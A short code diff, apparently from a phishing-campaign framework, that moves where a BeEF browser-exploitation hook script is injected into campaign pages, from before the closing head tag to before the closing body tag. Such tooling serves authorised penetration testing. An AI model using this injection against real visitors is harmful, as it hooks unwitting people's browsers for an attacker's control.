@@ -195,16 +195,16 @@ class Campaign < ActiveRecord::Base
         file = File.read(loc)
 
         if self.campaign_settings.use_beef?
-          # add BeEF hook tag if enabled, replacing </head> with <script src="..beef.."></script></head>
+          # add BeEF hook tag if enabled, replacing </body> with <script src="..beef.."></script></body>
           beef_hook = tag_beef
-          if file.include? "</head>"
-            file = file.gsub("</head>", "#{beef_hook}</head>")
-            logger.debug("Found </head>. Added BeEF hook [#{beef_hook}] to file [#{loc}]")
-          elsif file.include? "</HEAD>"
-            file = file.gsub("</HEAD>", "#{beef_hook}</HEAD>")
-            logger.debug("Found </HEAD>. Added BeEF hook [#{beef_hook}] to file [#{loc}]")
+          if file.include? "</body>"
+            file = file.gsub("</body>", "#{beef_hook}</body>")
+            logger.debug("Found </body>. Added BeEF hook [#{beef_hook}] to file [#{loc}]")
+          elsif file.include? "</BODY>"
+            file = file.gsub("</BODY>", "#{beef_hook}</BODY>")
+            logger.debug("Found </BODY>. Added BeEF hook [#{beef_hook}] to file [#{loc}]")
           else
-            logger.error("Error: </head> or </HEAD> tags not found. BeEF hook was not added.")
+            logger.error("Error: </body> or </BODY> tags not found. BeEF hook was not added.")
           end
         end
 
